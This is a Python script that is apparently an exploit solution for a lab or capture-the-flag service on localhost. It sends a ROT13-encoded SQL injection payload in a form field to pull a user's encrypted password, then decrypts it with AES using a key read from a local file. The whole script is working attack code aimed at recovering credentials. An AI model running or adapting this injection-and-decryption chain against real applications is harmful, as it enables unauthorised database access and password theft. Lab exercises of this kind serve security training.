#!/usr/bin/python3

import requests
import base64
import codecs
import hashlib

from Crypto import Random
from Crypto.Cipher import AES

# IT IS SET UP AS DEFAULT LOOPBACK INTERFACE BUT IF YOU NEED TO CHANGE THE URL,
# YOU HAVE TO DO IT MANUALLY

url = "http://127.0.0.1:8081"

def transform_input(name):
	# ADDING INJECTION PART
	transformed_input = f"{name}' OR name='{name}"
	transformed_input = codecs.encode(transformed_input, 'rot_13')
	return transformed_input

username = input("Please enter the username and wait to see cleartext password :)\n")
transformed_sql_query=transform_input(username)
print(transformed_sql_query)
form_values = {"fire":f"{transformed_sql_query}"}

with requests.session() as session:
   	r=session.post(url,data=form_values)

response=str(r.content)[1:]
final=response.split(" ")
final_string=final[-1]
encrypted_password=final_string.replace("(","").replace(")","").replace("[","").replace("]","").replace("'","")
final_string=encrypted_password[1:-2]

class AESCipher(object):

    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]

file = open('./key.txt', "r")
key = file.read()
file.close()

decryptor = AESCipher(key)
clear_text_password=decryptor.decrypt(final_string)
print(f"Here is the password of the {username} user that you provided : {clear_text_password}")
